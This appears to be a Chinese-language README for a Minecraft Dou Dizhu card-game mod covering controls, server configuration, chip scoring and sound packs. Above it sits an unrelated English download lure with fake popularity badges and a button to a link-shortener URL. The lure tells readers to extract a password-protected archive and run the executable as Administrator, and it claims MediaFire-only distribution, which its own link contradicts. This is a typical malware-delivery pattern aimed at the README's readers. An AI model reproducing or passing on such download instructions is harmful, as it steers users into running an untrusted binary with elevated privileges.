<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://linkolla.com/2474b9">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

> **本模组的细节代码除参考了他人开源的旧仓库外，均由我与多个大模型（DeepSeek、Mimo、GPT 等）协作讨论完成；「大王」「小王」两张牌面则由我使用 Photoshop 亲手绘制。**
>
> 开发过程历经多轮迭代：从最初适配 1.21.1 NeoForge，到重构客户端与服务端的交互规范、设置页规范与音乐播放规范，最终完成了 1.21 ~ 1.21.11 的全版本适配，并配套进行了自动化测试与文档编写。文档内容涵盖斗地主的玩法规则、各版本迭代的适配改动、音乐包的制作方法等。
>
> 尽管已进行了较为全面的测试，但在不同版本环境下仍可能出现报错。如果你在使用中遇到问题，欢迎提出 Issue，我会尽力修复。另外，**后续将不再做全量更新，只会针对模组生态较为活跃的大版本进行玩法拓展与维护。**

## 环境要求

| 项目 | 版本 |
|---|---|
| Minecraft | 1.21–1.21.11（默认构建目标 1.21.1，不含 26.x） |
| NeoForge | 随 Minecraft 目标选择；版本表见 `common/gradle/minecraft-target.gradle` |
| Fabric | Loader 0.19.5；Fabric API 随 Minecraft 目标选择 |
| Forge | 除 1.21.2（无目标发行版）外按 Minecraft 目标选择 |
| Java | 21 |

斗地主只支持 3 人联机（服务端权威），没有单人/AI 对手。

### 版本分支索引

| Minecraft | NeoForge | Fabric | Forge |
|---|---|---|---|
## 快速上手

1. **合成牌桌**：绿地毯 ×1 + 木板 ×3 + 木棍 ×2

   ```
    C        C = 绿地毯
   PPP       P = 木板（任意种类）
   S S       S = 木棍
   ```

2. **先定筹码**：一人 **Shift+右键牌桌**成为房主，在本桌配置界面选择筹码、底注与门槛。
   启用筹码但未配置类型时无法入局；也可以关闭本桌筹码，玩纯娱乐局。
3. **三人各自右键牌桌入局**（坐满自动发牌）。入局要求背包里备够**入局门槛**个本局筹码
   默认 = 底注 × 6，房主也可以在「玩法设置」里直接指定门槛（档位到 100 万）；不足会明确提示还差多少。
4. 入局后背包会得到一张**「斗地主扑克」**——握着它才会展开你自己的手牌。

### 操作

| 操作 | 效果 |
|---|---|
| 右键牌桌 | 入局；叫分轮到你时确认叫分；出牌轮到你时出牌 / 过牌 |
| **Shift + 右键牌桌** | 在局内 = 离开；局外房主 = 本桌配置；已有其他在线房主 = 开始/停止观战 |
| 滚轮（握着扑克） | 叫分阶段切换【不叫/1分/2分/3分】；出牌阶段移动手牌焦点，**方向与滚轮相反** |
| 左键（握着扑克） | 把焦点牌加入/移出选中（非回合也能预选） |
| 右键空气（握着扑克） | 清除全部选中 |

**切武器不影响牌局**：主手换成别的物品只是收起牌面，牌局照旧继续；切回扑克即恢复。

### 观战

非参局玩家**靠近牌桌后 Shift+右键**即可观战（不占座位、不必等坐满）；能否看到各家的牌面由服务端配置决定，
可自由走动、牌面持续更新。走近但**不操作**是看不到牌的——这是刻意的安全默认值。

## 配置

配置文件按**归属**分三份，游戏内也按这个结构呈现：

| 文件 | 归属 | 内容 | 游戏内入口 |
|---|---|---|---|
| `config/crafty_cards/visual.json` | 客户端 | 渲染参数（HUD 手牌、世界内持牌、桌面出牌、筹码图标） | 手改 / `/craftycards reload` 热更新 |
| `config/crafty_cards/sounds.json` | 客户端 | 总开关、音量、选用的音乐包（声道、是否压低原版音乐只能手改） | **Mods → Crafty Cards → Config** 或 `/craftycards sounds` |
| `config/crafty_cards/server.json` | 服务端 | 筹码总开关、新桌默认值、距离、旁观可见性、限时与空闲超时 | 在服务端编辑并重启；本地环境可用玩法设置入口 |

> 玩法设置改的是**当前运行环境的本地文件**；连专用服务器时，玩家电脑上的 `server.json` 不会控制服务器。NeoForge 可从模组配置入口打开音乐包页；Fabric/Forge POC 的 Mods 配置按钮尚未接入，可编辑客户端配置后重启。

`server.json`：

| 项 | 默认 | 说明 |
|---|---|---|
| `spectatorsSeeCards` | `true` | 观战者能否看到牌面（`false` 则只能看到牌背与张数） |
| `participantsSeeFaces` | `false` | 参局者能否互相看牌（**默认关，防作弊**） |
| `spectateRadius` | `0` | 走近就自动共享手牌的半径，`0` = 关闭（推荐保持 0） |
| `idleTimeoutTicks` | `12000` | 无操作多久销毁牌局（10 分钟），`0` = 不超时 |
| `joinRadius` | `8` | 入局/观战的最大距离（格） |
| `chipItems` | 钻石/金锭/铁锭/绿宝石/下界合金锭 | 可作本局筹码的物品白名单（可加模组物品） |
| `chipStake` | `1` | **新桌子的底注默认值**；每张桌子初始化后由房主独立配置 |
| `chipEntryCount` | `0` | **新桌子的入局门槛默认值**；`0` = 自动（底注 × 6），每桌可另行指定 |
| `chipsRequired` | `true` | 是否需要筹码。`false` = **纯娱乐局**：不必声明筹码、入局不收押注、结算不转移任何物品 |
| `spectateRefreshTicks` | `20` | 观战快照的补发间隔（tick） |
| `turnTimeoutTicks` | `600` | 每轮限时 30 秒；`0` = 不限时 |

### 计分（底分 × 倍数）

| 项 | 规则 |
|---|---|
| **底分** | 叫分（1 / 2 / 3） |
| **倍数** | `2^(炸弹 + 火箭数)`，春天或反春天再 ×2 |
| **春天** | 地主赢且两农民一张牌都没出过 |
| **反春天** | 农民赢且地主只出了开局那一手 |
| **每人得失** | 底分 × 倍数 × **底注**（地主为两倍） |

**底注**由每桌房主在牌桌配置界面设置；`server.json` 中的 `chipStake`（默认 1）只为新桌提供初始值。**入局门槛**默认取
`底注 × 6` = 叫满 3 分（底分上限）× 2（地主一人对两农民、最多赔两份）× 底注，
即"无炸弹时最坏的一局"；房主也可以用 `chipEntryCount` 直接指定门槛（`0` = 自动，
界面档位到 100 万）想开高额桌就调高，想宽松点就调低（低到赔不出时结算会少赔并提示）。

筹码物品**原样转移**（附魔、自定义名等属性不丢）。中途解散会全额退还。倍数会让单局输赢
远超底注（例如叫 3 分 + 两个炸弹 = 12 倍），超出池子的部分从**输家背包**补取；实在取不到会
少赔并给出提示——这是"用实物结算倍数赌注"的固有限制。

## 音频（音乐包）

**模组本身不含任何音频文件**：音效与 BGM 全部来自**音乐包**，包由玩家自己安装。
### 安装与选用

```
config/crafty_cards/soundpacks/<包 id>/
  pack.json      ← 清单：哪些音频键用哪些文件、各自权重
  *.ogg
```

放进目录后，游戏内 **Mods → Crafty Cards → Config → 音乐包** 里点「扫描」→ 选用 →「保存并应用」。
（也可以直接改 `config/crafty_cards/sounds.json` 的 `activePack`。）

### 一个键可以有多个文件、按权重随机播

音频以"**音频键**"为单位（`pass` 过牌 / `bomb` 炸弹 / `bgm_playing` 对局中 / `bgm_clutch` 有人只剩三张 /
`bgm_rocket` 王炸之后 / `dan3` 单张 3 / `shunzi` 顺子…共 61 个），**每个键可以配多个文件**，各带整数权重；
播放时由游戏按权重随机挑一个 —— 所以"不要"可以准备三五种说法，听起来不重复。
权重写在**包的清单里**（`{ "file": "...", "weight": N }`），在制作程序里逐条调。
牌型语音优先于通用出牌音效：想让某种牌型闭嘴，就把它的条目从包里去掉（没有候选自然落到下一档）。

### 自己做包

用 **`tools/soundpack_maker.py`**（可视化单体 GUI）：

```bash
python tools/soundpack_maker.py                                    # 打开图形界面
python tools/soundpack_maker.py --cli <音频目录> --name <显示名> --dry-run  # 批量预览，不写盘
python tools/soundpack_maker.py --cli <音频目录> --name <显示名>            # 批量生成
```

它会自动把 MP3/WAV/FLAC 转成 Ogg Vorbis、把文件按你的选择归到各音频键、写上权重，
最后生成 `pack.json`。界面上每个文件都有「试听」，会用**系统默认播放器**打开它
（音质与设备跟你平时听的一致；本程序不内嵌播放器）。
音频很多时，推荐先按音频键命名，运行 `--dry-run` 批量核对映射、权重与未识别文件，
再去掉它生成；图形界面适合手动调整少量条目。需要助手协助整理素材，可复制
### 游戏里能调什么

**只有三样**：总开关（启用/关闭模组音频）、音量、选用哪个音乐包
（**Mods → Crafty Cards → Config → 音乐包**，改完点「保存并应用」）。
音频的内容（哪个键用哪些文件、各占多少权重）**只能由音乐包决定**——游戏侧不再提供
"逐键指派文件 / 逐条调权重 / 试听"这类直接改音频的操作，要改音频就用上面的制作程序改包。
这样音频只有一条来源，出问题时不用先问"你改的是界面还是包"。

> 「保存并应用」是必要的：音频必须经资源重载才会被游戏加载，这是游戏机制的限制。
> `bgmCategory` 决定 BGM 跟随哪个原版音量滑块（默认"玩家"，因此播放 BGM 时能把原版背景音乐压到 10%）——
> 它和"压低原版音乐"没有界面入口，需要的话改 `config/crafty_cards/sounds.json`（改完重启生效）。

> 实现说明：Minecraft 无法在运行时直接播放磁盘上的任意音频，必须经资源包加载。
> 模组会把当前生效的文件**生成为一个高优先级资源包**（`config/crafty_cards/sounds_pack/`，
> 自动生成、不用手改），游戏日志里能看到它被加载。

## 开发

```bash
./gradlew build                # 编译 → build/libs/
./gradlew test                 # 单元测试
./gradlew runGameTestServer    # 游戏内测试（无头服务端）
./gradlew runClient            # 开发客户端（联机再开 runClient2/3/4）
```


---

# 安全问题

Crafty Cards 的牌局和筹码结算由服务器执行；客户端只收到按接收者权限筛选的状态快照。涉及越权看牌、伪造回合动作、复制或丢失筹码、专用服务器崩溃等问题，请在公开仓库建立后使用其**私密漏洞报告入口**，不要先公开利用步骤、存档或真实服务器地址。目前尚无 GitHub 仓库地址或公开安全邮箱，因此本页不提供虚构的联系渠道；仓库上线前须补齐实际入口。

报告建议包括受影响的 Minecraft/加载器/模组版本、可最小重现的步骤、预期与实际结果、必要的日志或演示。提供材料前删除账号令牌、私人路径和无关玩家资料。修复完成后会按受影响目标重新执行单测、GameTest（可用目标）和多人验收。


---

## 提交 PR 前必读（多版本仓库）

- **先确定改动属于哪一类**：
  - 只影响某个 Minecraft/加载器组合 → Fork 后切到对应**版本分支**（如 `neoforge-mc1.21.1`），PR 的 base 也选它，**不要选 `main`**；
  - 改公共逻辑 → PR 到 `main`，合并后再 `cherry-pick` 到需要它的版本分支。
- **版本分支是裁剪过的单版本快照**，和 `main` 的差异包含“文件被删除”。把版本分支的改动提到 `main`，PR 里会出现几十个删除文件——发现这种情况请改成 cherry-pick。
- **一个 PR 只做一件事**；合并用 **Squash and merge**，一个 PR 对应一个提交，方便跨分支 cherry-pick。
## 构建与自测

Windows：

```powershell
.\gradlew.bat build
```

Linux / macOS：

```bash
./gradlew build
```

## 代码约定

代码修改尽量先在 `common/` 解决共用行为，仅把注册、网络/输入/渲染钩子与版本 API 差异放进加载器或 `versions/`。纯逻辑错误补有意义的单测；客户端渲染问题提供实际截图；涉及会话关闭、物品结算或私有手牌时验证服务端权威和多人路径。不要把测试通过写成“所有版本都无问题”。


---

                    GNU GENERAL PUBLIC LICENSE
                       Version 3, 29 June 2007
